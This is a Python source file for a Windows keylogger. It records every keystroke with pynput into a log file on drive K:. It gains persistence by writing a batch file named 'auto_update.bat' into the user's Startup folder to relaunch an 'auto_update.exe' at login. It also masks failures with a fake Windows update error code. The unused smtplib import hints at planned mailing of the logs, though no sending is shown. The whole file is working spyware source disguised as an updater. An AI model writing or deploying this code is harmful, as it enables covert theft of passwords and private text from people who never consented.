import pynput.keyboard
import smtplib, ssl
import time
import getpass
import shutil
class Keylogger:
    
    def __init__(self): 
        self.logger = ""

    def send_data(self, keystrike):
        self.logger += keystrike
        with open("K:\\log.txt","a+",encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""

    def take_keys(self, key):
     try:
        hit_key = str(key.char)

     except AttributeError:
        if key == key.enter:
            hit_key = "\n" + str(key) + "\n"
        elif key == key.shift:
            hit_key = ""
        elif key == key.space:
            hit_key = ""
        elif key == key.backspace:
            # Handle backspace key here
            hit_key = ""
        elif key == key.enter:
            hit_key = "\n"
        elif key == key.caps_lock:
            hit_key = "\nCAPS LOCK\n"
        elif key == key.ctrl_r:
            hit_key  = "\nCtrl right\n"
        elif key == key.ctrl_l:
            hit_key = "\nCtrl left\n"
        else:
            hit_key = "" + str(key) + ""

     self.send_data(hit_key)

    def change_dir(self):
        try:
            username = getpass.getuser()
            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
            # Write content to the file
                file.write(f"""start K:\\auto_update.exe""")
        except Exception as e:
            print("Error [0x80070643]: Failed to Update")

    def main(self):
        listener = pynput.keyboard.Listener(on_press=self.take_keys)
        with listener:
            self.logger = ""
            self.change_dir()
            listener.join()
            


Keylogger().main()
